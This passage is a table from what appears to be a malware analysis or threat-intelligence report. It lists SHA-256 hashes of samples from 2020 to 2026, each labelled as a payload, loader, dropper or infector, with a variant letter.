| d419a9b17f7b4c23fd4e80a9bce130d2a13c307fccc4bfbc4d49f6b770d06d3b | 2023 | payload              | A       |
| 296d28eb7b66aa2cbea7d9c2e7dc1ad6ce6f97d44d34139760c38817aec083e7 | 2023 | payload              | A       |
| 3ba6c174a72e4bf5a10c8aaadab2c4b98702ee2308438e94a5512b69df998d5a | 2023 | payload              | B       |
| 4203271c1a0c24443b7e85cbf066c9928fcc69934772a431d779017fb85c9d73 | 2023 | payload              | B       |
| eea274eddd712fe0b4434dbef6a2a92810cb13b8be3deca0571410ee78d37c9f | 2024 | payload              | A       |
| a61386384173b352e3bd90dcef4c7268a73cd29f6ae343c15b92070b1354a349 | 2024 | payload              | A       |
| a34299a16cf30dac1096c1d24188c72eed1f9d320b1585fe0de4692472e3d4dc | 2024 | payload              | B       |
| b1dd18a6a4b0c6e2589312bbec55b392a20a95824ffe630a73c94d24504c553d | 2024 | payload              | B       |
| 989f7eb4f805591839bcbc321dd44418eb5694d1342e37b7f24126817f10e37e | 2024 | payload (extracted)  | B       |
| 8ea420d9aa341ba23cdea0ac03951bce866c933ba297268bc7db8a01ce8e9b8e | 2024 | payload (static ELF) | A       |
| 26082cd36fdaf76ec0d74b7fbf455418c49fbab64b20892a873c415c3bb60675 | 2024 | loader               | -       |
| 48a68d0555f850c36f7d338b1a42ed1a661043cacf2ba2a4b0a347fac3cb3ee6 | 2024 | dropper              | -       |
| fc2e0cb627a00d0e4509bd319271721ea74fb11150847213abe9e8fea060cc8a | 2024 | dropper              | -       |
| 8e83cbb2ed12faba9b452ea41291bcebdce08162f64ac9a5f82592df62f47613 | 2025 | payload              | A       |
| 2b2eeb2271c19e2097a0ef0d90b2b615c20f726590bbfee139403db1dced5b0a | 2025 | payload              | A       |
| 84828f31d741f92ce4bca98cfc2148ff8cff6663e2908a025b1386dd4953ffef | 2025 | payload (truncated)  | A       |
| 090b15fd8912cab340b22e715d44db079ec641db5e2f92916aa1f2bc9236e03e | 2025 | dropper              | -       |
| 64a3ebd3ad3927fc783f6ac020d5a6192e9778fb16b51cceba06e4ee5416adff | 2025 | dropper              | -       |
| b85ed15756568b85148c1d432a8920f81e4b21f2bc38f0cf51d06ced619e0e77 | 2025 | dropper              | -       |
| d3d204c19d93e5e37697c7f80dd0de9f76a2fb4517ced9cafd7d7d46a6e285ba | 2025 | dropper              | -       |
| 73b95b7d1006caf8d3477e4a9a0994eaa469e98b70b8c198a82c4a12c91ad49a | 2025 | infector             | -       |
| 04c06be0f65d3ead95f3d3dd26fe150270ac8b58890e35515f9317fc7c7723c9 | 2026 | payload              | A       |
| d7b487d2e840c4546661f497af0195614fc0906c03d187dc39815c811ea5ec3f | 2026 | payload              | A       |
| b982276458a85cd3dd7c8aa6cb4bbb2d4885b385053f92395a99abbfb0e43784 | 2020 | RHOMBUS dropper      | -       |
